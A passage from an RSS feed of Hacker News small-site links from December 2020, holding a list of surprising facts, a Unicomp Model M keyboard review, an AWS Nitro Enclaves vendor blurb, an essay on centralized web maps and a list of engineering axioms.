benefits.</li><li><strong>There's a Tsunami of Data Created Every Hour</strong>: More data is created every hour in 2020 than was created in all of the year 2000. (<a href="https://www.seagate.com/files/www-content/our-story/rethink-data/files/Rethink_Data_Report_2020.pdf">Seagate</a>)</li></ol><ol role="list"><li><strong>Hindu Nationalism Runs Deeper in India than I Knew:</strong> The RSS, a Hindu nationalist paramilitary organization, runs 30,000 schools, the largest network of farmers and social-welfare organization in the slums, the 2nd largest network of trade unions, and spawned the BJP, India's most powerful political party. (<a href="https://en.wikipedia.org/wiki/Rashtriya_Swayamsevak_Sangh#:~:text=RSS%20was%20founded%20on%2027,Hindu%20Rashtra%20(Hindu%20nation).)">Wikipedia</a></li><li><strong>The Caste System is Alive and Well in Indian Marriages</strong>: Only about 5% of marriages in India are between members of two different castes. (<a href="https://en.wikipedia.org/wiki/Inter-caste_marriages_in_India">Wikipedia</a>)</li><li><strong>Non-Chinese People Don't Want to Live in China:</strong> Sydney, Australia alone has more foreign-born residents than mainland China. (<a href="https://marginalrevolution.com/marginalrevolution/2019/12/china-facts-of-the-day-7.html">Tyler Cowen</a>)</li><li><strong>The UK Conservative Party (a.k.a the Tories) Have a Realllllly Old Support Base</strong>: In 2018, the party received twice as much money from dead members, through wills, as from the living. (<a href="https://www.bbc.co.uk/news/uk-politics-45271284">BBC</a>)</li><li><strong>Shutting Down Nuclear Power is a Really Bad Idea</strong>: After Fukushima, Germany shut down 50% of its nuclear power plants. This study estimates that this decision cost Germany $12 billiondollars, mostly from the cost of 1,100 excess deaths since then attributable to local air pollution from coal plants. (<a href="https://marginalrevolution.com/marginalrevolution/2020/01/nuclear-energy-saves-lives.html">Alex Tabarrok</a>)</li></ol><ol role="list"><li><strong>Don't Get Surgery on the Weekends:</strong> You are 44% more likely to die if you have surgery on a Friday (1.44%) compared to a Monday (1%). That jumps to 82% is you have surgery on a weekend. (<a href="https://danariely.com/2013/08/11/monday-is-good-for-something-after-all-surgery/">Dan Ariely</a>)</li><li><strong>Depression Dulls Your Senses:</strong> Depressed people have worse sense of smell, and people with worse sense of smell are more likely to get depressed. We already know that depression decreases visual contrast, causing the world to literally look washed-out and gray. (<a href="https://slatestarcodex.com/2020/04/17/depression-the-olfactory-perspective/">Scott Alexander</a>)</li><li><strong>America is Obese Partially Because Everyone is Eating Fast Food</strong>: Every day, about 84 million adults in America eat fast food. (<a href="https://www.cdc.gov/nchs/products/databriefs/db322.htm">Centers for Disease Control</a>)</li><li><strong>Zinc Dramatically Helps with Colds, If You Take a Lot Quickly:</strong> Most studies suggest that it'll shorten the cold by 12-48%. Nasal discharge goes down by 34%, congestion by 37%, and muscle ache by 54%. But you need to take a high dose, roughly 80 mg/day, started within 24 hours of the first symptoms. (<a href="https://www.ncbi.nlm.nih.gov/pmc/articles/PMC3273967/#:~:text=A%20meta%2Danalysis%20published%20in,were%20present%20after%207%20days.&amp;text=A%20meta%2Danalysis%20published%20in%20June%202011%20concluded%20that%20zinc,at%20daily%20doses%20%3E75%20mg.)">Source</a></li><li><strong>The Amish are Remarkably Healthy</strong>: The Amish outperform the English on every measured health outcome. 65% of Amish rate their health as excellent or very good, compared to 58% of English. Diabetes rates are 2% vs. 8%, heart attack rates are 1% vs. 6%, high blood pressure is 11% vs. 31%. (<a href="https://slatestarcodex.com/2020/04/20/the-amish-health-care-system/">Scott Alexander</a>)</li><li><strong>Calorie Counts are Mostly Lies</strong>: Labels on American packaged foods miss their true calorie counts by an average of 18%. The information on processed frozen foods misstates their calorific content by as much as 70%. (<a href="https://www.economist.com/1843/2019/02/28/death-of-the-calorie">The Economist</a>)</li><li><strong>American Offices are Tougher than I Thought:</strong> 48% of employees in the US alone have cried at work. (<a href="https://go.ginger.io/annual-behavioral-health-report-2019">Ginger</a>)</li></ol><ol role="list"><li><strong>Wealth Fades, Quickly</strong>: 70% of wealthy families lose their wealth by the 2nd generation, and 90% by the 3rd. (<a href="https://twitter.com/marshal/status/1281758727918542848">h/t Marshall Haas</a>)</li><li><strong>People are Less Rational than You Think:</strong> People spend more on lottery tickets than movies, video games, music, sporting events, and books combined. (<a href="https://twitter.com/david_perell/status/1285364113741209600?lang=en">David Perell</a>)</li><li><strong>The US is Rich. Really Rich</strong>: If the United Kingdom was a US state, it would be the third poorest by GDP/capita, only Arkansas and Mississippi are lower. (<a href="https://en.wikipedia.org/wiki/List_of_U.S._states_and_territories_by_GDP_per_capita">Wikipedia</a>)</li><li><strong>Tesla is Big. Really Big</strong>: On July 14th, â€¦</li></ol></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.kashdhanda.com/post/52-things-i-learned-in-2020">https://www.kashdhanda.com/post/52-things-i-learned-in-2020</a></em></p>]]>
            </description>
            <link>https://www.kashdhanda.com/post/52-things-i-learned-in-2020</link>
            <guid isPermaLink="false">hacker-news-small-sites-25501631</guid>
            <pubDate>Tue, 22 Dec 2020 00:49:34 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Unicomp New Model M Keyboard]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 6 (<a href="https://news.ycombinator.com/item?id=25501600">thread link</a>) | @todsacerdoti
<br/>
December 21, 2020 | https://www.softinio.com/post/unicomp-new-model-m-keyboard/ | <a href="https://web.archive.org/web/*/https://www.softinio.com/post/unicomp-new-model-m-keyboard/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><article><img src="https://www.softinio.com/img/unicomp_new_model_m.png"><p>Unicomp new Model M keyboard is the latest version of the classic and fabulous IBM Model M keyboard that came out earlier this year. This blog post is my unboxing and review of this timeless keyboard.</p><p>My favorite keyboard of all time was the <a href="https://en.wikipedia.org/wiki/Model_M_keyboard">IBM Model M keyboard</a>. Through out the 1980s and the 1990s I would exclusively use this keyboard. In fact as I type this blog post I can confirm I still have 3 of them in my garage back in London, England.</p><p>Ever since I moved to the USA, both at work and at home I have been using various keyboards by Apple. Though I have nothing bad to say about the Apple keyboards, after all they are cosmetically pleasing, of high build quality and work really well with all things Apple, I started really missing my IBM Model M. This is when I found out Unicomp have released a new Model M and I decided to buy one.</p><h2 id="who-are-unicomp">Who are Unicomp?</h2><p>When IBM decided to stop manufacturing keyboards, a company called Lexmark bought their equipment and all rights to their keyboards and continued making them. In turn Lexmark stopped manufacturing keyboards too and at that point some ex-IBM and ex-Lexmark staff got together, purchased all the manufacturing equipment and rights to continue manufacturing the keyboards (but of course without the IBM and Lexmark branding) and setup a new company called <code>Unicomp</code>. <a href="https://www.pckeyboard.com/">Unicomp</a> has since continued producing these keyboards for like the last 25 years.</p><h2 id="unboxing">Unboxing</h2><p>This is how it was delivered:</p><p><img src="https://www.softinio.com/img/unicomp_model_m_box.png" alt="Unicomp New Model M box"></p><p>When the package arrived I could feel the keyboard moving inside the box, but when I opened the box I saw how well it was packed:</p><p><img src="https://www.softinio.com/img/unicomp_model_m_open_box.png" alt="Unicomp New Model M opened box"></p><p>I took it out of its box and removed all packaging material it was wrapped in:</p><p><img src="https://www.softinio.com/img/unicomp_model_m_out_of_box.png" alt="Unicomp New Model M Keyboard"></p><h2 id="review">Review</h2><p>As I looked at the keyboard, before taking it out of the box, I could immediately tell it was a Model M and its evolution. Super excited and impatient I took it out of the box. My first observation was that it comes with a USB (standard not USB-C) cable that is not removable. It felt lighter in weight than the original IBM Model M I had. Next I looked at its build quality and was overall impressed. The original IBM Model M does feel more robust but I could not fault this new Model M. All this was to be expected though, as I didnâ€™t have my expectation set to receiving a keyboard that is made by 100% the same materials as the original Model M I had.</p><p>Having one of the newer macbooks with only USB-C ports, I set my new keyboard on my desk and plugged it in via a USB adapter and off I went looking for excuses to type so I can use my new keyboard.</p><p>I am thoroughly enjoying using this keyboard. Its typing feel and size are on par with the original Model M I had. I had forgotten how much more comfortable it is to type on Model M than an Apple keyboard. Comparing now, I can see that my hands are too big for the Apple keyboards so I would try to type in a cramped space to fit my hands in, as opposed to this Model M which is perfect for my hand size. This alone has resulted in me being able type faster, be more comfortable and make virtually no typing mistakes. As always I find the higher actuation point feel and the audible feedback the sound provided by the buckling springs with each keystroke incredibly pleasing. Comparing the sound of the buckling springs with the original IBM Model M, I would say the new Unicomp Model M is slightly quieter.</p><h3 id="how-well-does-it-work-with-macos">How well does it work with macOS</h3><p>When I went to place my order on Unicomp website they only had a windows version of the new Model M listed. Whilst that will work fine with macOS, it does have some features missing compared to a keyboard that has dedicated support for macOS, such as volume control, music play/stop/previous track /next track keys. Good news is I called Unicomp and spoke to Troy about this and he was kind enought to tell me I can place an order and request a custom configuration at a small fee to have the extra macOS features added. I did that and my keyboard has all the extra macOS keys functioning as expected. It even has the window key replaced with the macOS command key.</p><p><img src="https://www.softinio.com/img/unicomp_model_m_mac_keys.png" alt="Unicomp New Model M with macOS layout"></p><h3 id="unicomp-quality-of-service">Unicomp quality of service</h3><p>When you first visit Unicomp website, you get the sense that you just visited a website from 20 years ago with not the best user experience browsing or ordering. When you research Unicomp on the internet you wonâ€™t find much activity on social media or any form of marketing.</p><p>Please do not be put off by this and donâ€™t judge them because of their dated look. The quality of service I received is one of the best I have ever received. When I called to find out more about the New Model M not only was the help I received exemplarity, but once I placed my order, even though it had the custom configuration of macOS support added was shipped within 24 hours of placing the order and the item received is fantastic in every possible way.</p><h2 id="conclusion">Conclusion</h2><p>I am back again reunited with my old friend a Model M. I am enjoying using it so much after a gap of not having one that I am looking for excuses to use it more and more. So expect more <a href="https://www.softinio.com/">blogs</a> and <a href="https://softinio.substack.com/">newsletters</a> from me going forward, as this keyboard is a joy to use.</p><h2 id="references">References</h2><ul><li><a href="https://www.pckeyboard.com/page/product/NEW_M">Link to Unicomp Model M that I ordered</a></li></ul></article></div></div></div>]]>
            </description>
            <link>https://www.softinio.com/post/unicomp-new-model-m-keyboard/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25501600</guid>
            <pubDate>Tue, 22 Dec 2020 00:44:12 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The One Hundred Best Albums of 2020]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25501586">thread link</a>) | @jger15
<br/>
December 21, 2020 | http://tedgioia.com/bestalbumsof2020.html | <a href="https://web.archive.org/web/*/http://tedgioia.com/bestalbumsof2020.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>http://tedgioia.com/bestalbumsof2020.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25501586</guid>
            <pubDate>Tue, 22 Dec 2020 00:41:35 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Nitro Enclaves reduce the attack surface on EC2]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25501492">thread link</a>) | @boxstream
<br/>
December 21, 2020 | https://www.anjuna.io/amazon-nitro-enclaves | <a href="https://web.archive.org/web/*/https://www.anjuna.io/amazon-nitro-enclaves">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-widget-type="cell" data-x="0" data-w="7">

<div>
<div>
<div data-widget-type="custom_widget" data-x="0" data-w="12">
<p><span id="hs_cos_wrapper_widget_1587145336592_" data-hs-cos-general-type="widget" data-hs-cos-type="rich_text"><h2>Move even the most sensitive applications and data to the cloud.</h2>
<p>Anjuna and AWS have closely collaborated over the last year to optimize Anjuna Enterprise Enclaves running on AWS Nitro Enclaves.</p>
<p>Secure enclaves establish a secure, comprehensive solution that protects data, applications, and storage from insiders and third parties wherever theyâ€™re executed and storedâ€”on-premises, and in both private and public clouds.&nbsp;</p>
<p>AWS Nitro Enclaves enable customers to further protect and securely process highly sensitive data, such as personally identifiable information (PII), healthcare, financial, and intellectual property within Amazon EC2 instances. Nitro Enclaves use the same Nitro Hypervisor technology that provides CPU and memory isolation for EC2 instances.</p>
<h2>Data is now secure by default.</h2>
<p>With Anjuna Enterprise Enclaves, data is secure by default. Anjuna builds on the enclave-enabling technology in Nitro Enclaves to extend data protection beyond memory and protection to storage and networks.</p>
<p>Anjunaâ€™s â€œlift and shiftâ€ approach eliminates the need to work with ever-changing applications and software development kits (SDKs). And no changes to applications, recompilation, or operations are required.</p></span></p>

</div><!--end widget-span -->
</div><!--end row-->
</div><!--end row-wrapper -->

</div></div>]]>
            </description>
            <link>https://www.anjuna.io/amazon-nitro-enclaves</link>
            <guid isPermaLink="false">hacker-news-small-sites-25501492</guid>
            <pubDate>Tue, 22 Dec 2020 00:26:53 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Should web maps be centralized services?]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25500989">thread link</a>) | @bdon
<br/>
December 21, 2020 | https://bdon.org/blog/web-map-services/ | <a href="https://web.archive.org/web/*/https://bdon.org/blog/web-map-services/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p>Should web maps be centralized services?</p>

<p>
How many web applications or mobile apps do you use that have a map component? Rideshare apps display the location of drivers and passengers; ratings sites show the locations of restaurants; Craigslist and Wikipedia show contextual location for classifieds or encyclopedia articles. High quality, interactive maps are pervasive and simply fade into the background for end users.
</p>

<p>The COVID-19 pandemic has created a surge of new mapping applications. Beyond websites that <a href="https://coronavirus.jhu.edu/map.html">visualize the case count in different regions</a>, maps have become <b>critical computing infrastructure</b> for delivering health services.
</p>

<div>
    <div>
        <h5>Maps as Infrastructure</h5>
        <p>The New York City government uses Google Maps to help residents find a COVID-19 testing location near them.</p>
        
    </div>
    <p><img src="https://bdon.org/blog/web-map-services/NYCCovidSites.png">
    </p>
</div>
<div>
    <div>
        <h5>Maps and Citizen Tech</h5>
        <p>The Taiwan government rationed face masks at pharmacies and published inventories via a public API; this enabled citizen developers, in combination with geocoding services and third-party basemaps, to create a variety of web and smartphone applications.</p>
        
    </div>
    <p><img src="https://bdon.org/blog/web-map-services/Pharmacies.jpg">
    </p>
</div>

<p>
For a developer who wants to integrate a map into their application, the choices are almost always to use a <b>hosted, centralized map service</b>; developer map mindshare is dominated by multinational companies. Some hosted map examples:
</p>
<ul>
    <li>The embeddable native maps on Google's Android or Apple's iOS/iPadOS/macOS/watchOS operating systems</li>
    <li>Google's commercial web map offering (Google Maps JavaScript API)</li>
    <li>Microsoft's recent release of Azure Maps and Amazon's AWS Location Service</li>
    <li>Commercial map GIS companies such as ESRI, MapQuest, CloudMade, HERE and Mapbox; free hosted maps like <a href="https://openstreetmap.org/">OpenStreetMap Carto</a> or <a href="http://maps.stamen.com/">maps by Stamen Design</a></li>
</ul>

<h4>What is a basemap?</h4>

<p>Typical parts of a map application include:</p>
<ul>
    <li>Translation from search tokens or addresses to locations (geocoding)</li>
    <li>Determining the place name or administrative division of a location (reverse geocoding)</li>
    <li>Finding directions between two locations (routing)</li>
    <li>Overlaying of domain-specific geographic features, such as COVID-19 testing sites</li>
    <li><b>Showing physical and cultural context</b> on maps, such as city names, nearby points of interest, and roads</li> 
</ul>

<p>It's this last component that we usually call a <b>basemap</b> - especially if it <b>displays map labels</b>, and is zoomable or <b>multi-resolution, implying the application of <i>cartographic generalization</i></b>.


</p><div>
    <div>
        <h5>Map Labels</h5>
        <p>A basemap is most useful for context if it displays map labels. Labels may be in a single language, but might display more than one language, alternate names, or transcriptions: for example, Romaji labels on maps of Japan.</p>
         
    </div>
    <p><img src="https://bdon.org/blog/web-map-services/LabelScript.jpg">
    </p>
</div>

<div>
    <div>
        <h5>Generalization - More Art than Science</h5>
        <p>When the map scale is decreased - in this case by a factor of 2 - less relevant geographic features can be removed from the map. The ideal generalization <b>keeps the visual density of the map constant as scale is decreased</b>, even though the number of geographic features existing within those bounds increases exponentially.</p>
         
    </div>
    <p><img src="https://bdon.org/blog/web-map-services/Generalize.jpg">
    </p>
</div>
<p>
Single-scale wayfinding maps you see in the real world are labeled and generalized by cartographers; multi-scale basemap services accomplish this in an <b>automated way</b>. The sophistication of computer programs to do this - especially at whole earth scale - can be grossly underestimated, even by experienced programmers. Good labeling and generalization are taken for granted, like good font rendering and typesetting - invisible when successful, glaringly flawed when unsuccessful. 
</p>
<p>This also illustrates the key difference between a basemap and a dataset of geographic features, such as <a href="https://openstreetmap.org/">OpenStreetMap</a>. <b>OSM is not a cartographic product; it does not attempt any generalization or ranking of features. </b> <a href="http://naturalearthdata.com/">Natural Earth</a> is an example of a cartographic product - it include fields such as <code>scalerank</code> to assist in generalization, curated by human editors.
</p>
<p>
<b>In theory, basemaps are fungible</b> - the cartographic context required is similar among diverse applications. So why do developers - and as a consequence, the World Wide Web - gravitate towards a small handful of hosted map platforms?
</p>

<h4>Mapmakers: Victims of Lofty Expectations</h4>

<p>
    The basemap status quo is defined by the cutting edge commercial product, and right now that's Google Maps. <b>Users are accustomed to, and will demand, a seamless abstraction of the physical world.</b> Map panning and zooming should be instantaneous, so designers of a high performance cartographic system must take into account:
</p>
<ul>
    <li>The completeness and quantity of the underlying geodata</li>
    <li>The arrangement and indexing of geodata to achieve low latency</li>
    <li>Tile schemes and partitioning for generalized data</li>
    <li>Protocols for fetching and caching those tiles over the network</li>
    <li>Choice of a rasterization API like Cairo or OpenGL and the flow of vertex data to them</li> 
</ul>
<p>
The desired end product is a videogame-like, sixty-frames-per-second experience, and map systems often make the same technical compromises as games: for example, a map system that smoothly resizes labels in real time may choose to precompute <a href="https://en.wikipedia.org/wiki/Signed_distance_function#Applications">signed distance fields</a> for text glyphs on the server and fetch them by <a href="https://en.wikipedia.org/wiki/Plane_(Unicode)#Basic_Multilingual_Plane">codepoint ranges</a>. This works beautifully for languages that use at most a few hundred Latin characters, but navigating to places that use Han characters such as China or Japan will degrade performance. Thus a cartographic system demands holistic design around tradeoffs such as latency or localization capabilities.
</p>
<div>
    <div>
        <h5>Not Good Enough Anymore</h5>
        <p>Mapquest in the early 2000s required the user to click arrow buttons to pan and zoom; maps in 2020 are expected to respond instantly to mouse wheel scroll and finger pinch gestures.</p>
        
    </div>
    <p><img src="https://bdon.org/blog/web-map-services/mapquest-2.png">
    </p>
</div>

<h4 id="cartography-commodity">Serving Maps: best left to BigCorps?</h4>
<p>
    Given the demanding technical requirements above, it's easy to be led into thinking <b>maps are too hard for individual developers to solve and should be outsourced to a third-party hosted service.</b> A cartographic system is very "full-stack" in nature, but the commoditization of some potential components, like PostGIS or HTTP accelerators, makes the overall task less daunting. Bigness isn't really a constraint; the OpenStreetMap dataset as XML is <a href="https://planet.openstreetmap.org/">about 100 gigabytes</a>. Let's estimate 10x expansion to make a cartographic product; that's still only a terabyte of data to put on a disk somewhere.
</p>
<p>
<b>Developers believe something is too hard, until it isn't.</b> Issuing of SSL Certs was in practice limited to a few Certificate Authorities until Let's Encrypt; Hosting of seekable video content was only done by big sites in concert with CDNs, but now we have the standardized, hardware-accelerated HTML <code>video</code> element and ubiquitous broadband. Email is a notable counterexample; you've been able to run your own Mail Transfer Agent since the beginning, but the Hobbesian underworld of spam and phishing drives users into the oligopoly of a few providers.
</p>

<p>Serving maps is hard but not insurmountable; I'll suggest a factor limiting the landscape of web maps is not data bigness or the speed of slinging geodata down tubes, but licensing and realities of the market.</p>

<h4 id="cartography-commodity">Intellectual Property, Fine Print</h4>
<p>Firstly, mapmaking businesses rightly assert copyright over their cartography. This far predates webmaps: <a href="https://en.wikipedia.org/wiki/Trap_street">Trap Streets</a> are a longstanding practice on print maps. This is often true even if the map is built from open data such as OSM - the derivation of a cartographic product, and quality of output, is "secret sauce" to achieve product differentiation.
</p>
<p><b>Secondly, map serving easily admits a Software-As-A-Service (SaaS) business model.</b> Shrink-wrapped software, or creating a piece of software and "selling it in a box", has been out of vogue for decades, possibly over piracy concerns, or because it has less extractive potential on enterprise budgets. 
In addition to copyright, <b>Terms of Service for hosted maps often prohibit combination with other geographic services, exclude specific use cases, or forbid caching.</b> These contracts work against developers by inventing scarcity: even if you need a small subset of map tiles, they must be fetched and billed; don't scrape the data and put it in version control.</p>
<p>
<b>The freemium, ToS-constrained nature of hosted map services disincentivizes innovation.</b> Inability to swap out the Google Maps frontend means interesting problems like labeling and generalization can't be attacked with piecemeal incrementalism. This tips developer's scales toward <i>Buy</i> rather than <i>Build</i>, especially when the hosted pay-per-hit product starts out free, often as a <a href="https://en.wikipedia.org/wiki/Loss_leader">loss leader</a> for a <a href="https://en.wikipedia.org/wiki/Product_bundling">bundle</a> of geospatial services. These market realities leave some mapping use cases underserved by existing technology.
</p>

<h4>Map applications ought to outlive the SaaS business lifecycle</h4>

<p>Accessing a web map over the network isn't always practical. Maps may need to be displayed on air-gapped internal applications, or work offline without cell tower reception.</p>

<p>Also, websites and mobile applications are often built by organizations separate from their long-term maintainers (e.g. universities, museums, cultural institutions); ambitious visualization projects may be deterred by clients not wanting to foot a pay-per-hit subscription. An application depending on a hosted map service may be permanently disabled if the provider deprecates their API. <b>Hard dependencies on hosted services make software worse</b> - if your data visualization uses Google Maps, don't count on it still working in a couple years.</p>
<div>
    <div>
        <h5>Small-Scale Map Apps</h5>
        <p><a href="https://bdon.org/blog/web-map-services/80s.nyc">80s.nyc</a> is a streetview-like application for navigating historical images of New York City. It can be useful for <a href="https://medium.com/@dougbarclay/nana-at-the-doorway-4cf91888233b">discovering lost pictures of your great-grandmother</a>. Depending on a hosted basemap API would expose non-commercial projects to the whims and business models of SaaS providers.</p>
         
    </div>
    <p><img src="https://bdon.org/blog/web-map-services/80snyc.jpg">
    </p>
</div>

<h4>Developers ought to be able to control their map content</h4>
<p>Self-hosted has some generic advantages - â€¦</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://bdon.org/blog/web-map-services/">https://bdon.org/blog/web-map-services/</a></em></p>]]>
            </description>
            <link>https://bdon.org/blog/web-map-services/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25500989</guid>
            <pubDate>Mon, 21 Dec 2020 23:26:47 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[My Engineering Axioms]]>
            </title>
            <description>
<![CDATA[
Score 225 | Comments 46 (<a href="https://news.ycombinator.com/item?id=25500815">thread link</a>) | @mnouquet
<br/>
December 21, 2020 | https://martinrue.com/my-engineering-axioms/ | <a href="https://web.archive.org/web/*/https://martinrue.com/my-engineering-axioms/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
            <h3>My Engineering Axioms</h3>

            <p>A few months back I gave a talk in which I shared a list of my personal engineering axioms â€“ things that, over the years, I've come to think of as generally true and useful to have in mind when writing code, building things, and working with others.</p>

            <p>Axiom is a fancy word, but popping a few layers off the etymology stack we arrive neatly at the ancient Greek word <a href="https://en.wiktionary.org/wiki/%E1%BC%80%CE%BE%CE%AF%CF%89%CE%BC%CE%B1">á¼€Î¾Î¯Ï‰Î¼Î±</a>, or "that which is thought fit or worthy". I like that, and consider each item on the list at least worthy of consideration.</p>

            <p>Of course they're <b>my</b> engineering axioms â€“ things I believe to be useful based on my own experience. Your experience may well differ. Maybe you already knew about <a href="https://martinrue.com/zzuy-a-lesson-in-perseverance/">zero termination</a>, or have better tools than <a href="https://martinrue.com/give-yourself-more-playtime/">scissors to remove bugs</a> from your programs.</p>

            <p>In any case, I thought it would be fun to share the list here, with a few brief clarifications. Some things are pretty unsurprising, but hopefully others will generate some provocative thoughts and/or interesting disagreements.</p>

            <h4>1. Change is constant.</h4>

            <p>This one shouldn't be too controversial. Almost everything is always changing, including the rate of change itself. We need to acknowledge not only that our ability to respond to change is crucial, but that how well we do it (time, cost, quality, reliability) is often a dimension of our competitiveness.</p>

            <h4>2. Your product is an asset, but code is a liability.</h4>

            <p>Your product solves your customer's problem(s), and therefore is your asset. The code itself is the cost of creating the asset. The more code you have, the more it needs to be read, tested, changed, and understood. This is especially relevant when you consider axiom 1. Accept new code (and dependency on external code) conservatively. The best code is code you don't have to write.</p>

            <h4>3. Duplication is less costly than premature abstraction.</h4>

            <p>Until you have a high degree of confidence that your abstraction is going to pay for itself because it solves a real, abstract problem you really do have, don't do it. Wait and learn more. Until then, repeating code can help avoid dependency, which itself makes the code easier to change independently or delete. A premature abstraction creates complexity through dependency and indirection, and can become a bottleneck to your ability to respond to change.</p>

            <h4>4. Code should be easy to delete.</h4>

            <p>Write code to be removable, which in large part is the same as saying "decoupled". For sure not all code needs to be similarly removable, but minimising dependencies, having clear boundaries via well-defined interfaces, and having a thoughtful overall system design allows parts to be removed/changed more easily. I once heard someone use the expression "code spent", as an alternative to "code written" and I love that. I like the implication that removing code is reducing future cost.</p>

            <h4>5. Existing code exerts a powerful influence.</h4>

            <p>The very fact it's there suggests it's correct and necessary. Hopefully it is, but not always. We need to maintain both the confidence to change it, and the ability to reason about whether we should. Don't let the existence of code itself create doubt that it can't be removed. As per axiom 4, it should be easy to remove, and the system design should be good enough to enable us to understand whether we still need it.</p>

            <h4>6. Accidental complexity is one of the biggest risks.</h4>

            <p>Accidental complexity is complexity that can be avoided, and occurs due to things like poor design, bad decisions, and not prioritising an appropriate level of simplicity within a system. If simplicity is not a goal, accidental complexity is more likely to occur as a system grows, and will gradually negatively affect almost everything from changing the system to even being able to understand it. The 2006 paper <a href="http://curtclifton.net/papers/MoseleyMarks06a.pdf">Out of the Tar Pit</a> is a worthwhile read on this subject.</p>

            <h4>7. Technical excellence can be shadowed by bad personal skills.</h4>

            <p>Unless you're working completely alone, it's not just your ability to solve technical problems, to write good code, etc, that matters. To the contrary, they matter even less if you make the people around you unhappy and less productive. Just like learning to write good code, you have to learn "to people" good as well. Empathy is a big part of this, as is recognising that people are different â€“ be caring, be understanding, help others and ask for help yourself, be nice. Be an engineer others want to work with.</p>

            <h4>8. You are not your code. Be kind to the coder, not to the code.</h4>

            <p>Code is merely a moment in time that captured what we thought we knew about something. It's not you. You may have wrote it, but since that moment (even if it was 3 minutes ago) you've grown, but the code has not. A conversation about code, good or bad, should never be personal. Keep it professional. Talk about the code, or about the problem, but don't make it about the person who wrote it. Use "we" instead of "you". Sometimes I try to pretend I wrote the code someone else wrote, which helps me avoid accidentally sounding personal.</p>

            <h4>9. Treat people who know less than you with respect and patience.</h4>

            <p>We all start somewhere, and the journey is a lot more joyful when you're surrounded by patient people who want you to succeed, rather than those who make you feel like you don't belong. If you struggle with this, it may be helpful to remember that the newbie programmer almost certainly does something better than you do â€“ perhaps they're fluent in another language, or cook amazingly, or play a sport. Just imagine yourself in the reverse role. How would you like them to treat you, the total newbie? Again: be an engineer others want to work with.</p>

            <h4>10. The only true authority stems from knowledge, not from position.</h4>

            <p>Knowledge and understanding of the problem, the domain, the customer, are all far more important than whatever the first 3 letters on your business card are. <a href="https://youtu.be/cISYzA36-ZY?t=85">Even if it does have a watermark</a>. Understand how something works from first principles, build a solid understanding, and authority will follow.</p>

            <h4>11. Teaching is a form of learning in disguise.</h4>

            <p>If you think you know something, try teaching it. Often the very act of trying to explain what you know to someone else forces you to formalise your own thoughts much more clearly. Writing things down seems to have a similar effect. I've lost count of the number of times I've begun explaining something only to find I don't quite understand it as well as I thought.</p>

            <h4>12. Lift the skills of people around you, not just yourself.</h4>

            <p>A great team is never a great because of one amazing person. It's a great team because everyone challenges each other and everybody grows together. When you learn something cool, share it â€“ help the people around you get better. As they do the same, everybody benefits and nobody gets left behind. It's also far more fun. Secondary benefit: axiom 11.</p>

            <h4>13. The longer you wait the more you'll know.</h4>

            <p>I'm still learning this and trying hard to avoid my almost default desire to decide quickly. The truth is, the longer you delay non-essential decisions the more information you'll have to lean on when the time comes to make it. Of course you can't always procrastinate a decision, but often you can, and as a minimum you should at least consider whether not knowing the answer right now is actually OK.</p>

            <h4>14. A good type system is worth its weight plus some.</h4>

            <p>Having gone backwards and forwards through various static and dynamic languages over my career, I'm currently of the opinion that a good type system is worth its overhead. A good type system shouldn't carry all that much overhead. If the type system is designed well, it can almost feel like a dynamic language (via features like inference and flow analysis) while removing a whole class of issues that the compiler can handle far better and quicker than you can. Developments like ownership in Rust are a nice example of how this has gone even further than people would have imagined years back.</p>

            <h4>15. The right team of people trumps everything else.</h4>

            <p>Having a team of people who just want to work together and build great things makes a lot of other problems easier to deal with. The word "right" here is highly subjective and contextual, but at least anecdotally, empathy, respect, and friendship have been recurring elements of great teams I've been part of.</p>

            <h4>16. Stick to boring technology, unless there's a good reason not to.</h4>

            <p>Boring tech is often older and better understood. There's battle-hardened experience of how to use it effectively, better understanding of its failure modes, and it's easier to find people and resources on how to best apply it. I really like Dan McKinley's idea of <a href="https://mcfunley.com/choose-boring-technology">innovation tokens</a>. You only get 3. Use them to adopt or build brand new stuff â€“ ideally stuff that will make you better at your core competency â€“ but any more than 3 and the risk of never reaching stability/maturity starts to grow.</p>

            <h4>17. Have the smallest team possible, but no smaller. Grow it carefully.</h4>

            <p>A play on a well-known quote, and your mileage may vary on this one. In my career so far, I've reliably seen smaller teams be more effective than larger ones. There's a balance to be found, for sure, which depends on the magnitude and complexity of the problem you're solving. That said, smaller teams benefit from less communication overhead, less room for miscommunication, and more space for everyone's voice to be heard. In a smaller team, it also feels more personal, and I feel more responsible, and I like that.</p>

            <h4>18. Rest.</h4>

            <p>I'm happy to see the gradual de-sexification of â€¦</p></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://martinrue.com/my-engineering-axioms/">https://martinrue.com/my-engineering-axioms/</a></em></p>]]>
            </description>
            <link>https://martinrue.com/my-engineering-axioms/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25500815</guid>
            <pubDate>Mon, 21 Dec 2020 23:08:18 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Write code. Not too much. Mostly functions.]]>
            </title>
            <description>
<![CDATA[
Score 794 | Comments 337 (<a href="https://news.ycombinator.com/item?id=25500671">thread link</a>) | @brundolf
